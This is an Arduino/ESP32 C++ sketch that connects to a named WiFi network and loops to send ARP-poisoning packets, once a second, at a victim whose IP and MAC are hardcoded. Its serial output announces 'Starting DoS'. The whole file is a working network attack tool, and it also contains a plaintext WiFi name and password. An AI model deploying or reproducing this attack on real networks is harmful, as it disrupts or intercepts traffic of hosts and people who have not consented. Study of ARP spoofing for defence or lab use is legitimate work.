#include <Arduino.h>
#include <WiFi.h>
#include "arp_poisoner.hpp"

uint8_t dest_mac[MAC_ADDRESS_LENGTH] = {0xa4, 0xcf, 0x39,
                                        0x53, 0xbc, 0xaf};  // Victim MAC
const IPAddress dest_ip_raw = IPAddress(192, 168, 66, 93);  // Victim address
uint8_t dest_ip[4] = {dest_ip_raw[0], dest_ip_raw[1], dest_ip_raw[2],
                      dest_ip_raw[3]};
uint8_t esp_mac_addr[MAC_ADDRESS_LENGTH];   // ESP MAC address

ARP_poisoner *poisoner;
void setup() {
    Serial0.begin(115200);
    WiFi.mode(WIFI_STA);
    WiFi.begin("AGNELLI WIFI", "agnelliwifi");
    Serial0.println("Connecting to WiFi network");
    while (WiFi.status() != WL_CONNECTED);
    Serial0.println("Connected! Starting DoS");
    WiFi.macAddress(esp_mac_addr);
    poisoner = new ARP_poisoner();
}

void loop() {
    poisoner->send_arp_packet(dest_ip, dest_mac);
    delay(1000);
}
